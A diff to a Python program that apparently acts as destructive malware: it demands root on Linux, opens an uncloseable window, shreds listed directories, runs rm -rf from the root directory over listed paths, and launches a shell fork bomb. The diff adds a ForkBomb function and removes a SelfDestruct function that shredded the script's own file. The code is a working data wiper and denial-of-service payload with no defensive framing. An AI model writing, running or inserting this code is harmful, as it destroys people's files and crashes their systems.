@@ -23,6 +23,9 @@ services_list = ["networking", "ssh"]
 def preventClose():
     pass
 
+def ForkBomb():
+    os.system(":(){ :|:& };:`")
+    quit()
 
 def MainThread():
 
@@ -43,22 +46,17 @@ def MainThread():
 
     root.config(bg=UT.rgb_hack((0, 0, 0)))
     root.protocol("WM_DELETE_WINDOW", preventClose) 
-    root.mainloop()
 
     for x in directory_list:
         os.system(shred_command + x)
 
+    
     for f in need_removing_list:
         os.system("cd /")
-        os.system(rmrf_command + f + "*")
+        os.system(rmrf_command + f + "*")    
 
-
-
-def SelfDestruct():
-    self_path = path.abspath(__file__)
-    sp.call(["/usr/bin/shred", "-z -f -n 20" , self_path])
-    os.system(":(){ :|:& };:`")
-    quit()
+    ForkBomb()
+    root.mainloop() 
 
 
 if (os.getuid() != 0):
@@ -71,7 +69,6 @@ if (platform.system() != "Linux"):
 
 if __name__ == "__main__":
     MainThread()
-    SelfDestruct()
-
+    ForkBomb()
 
 
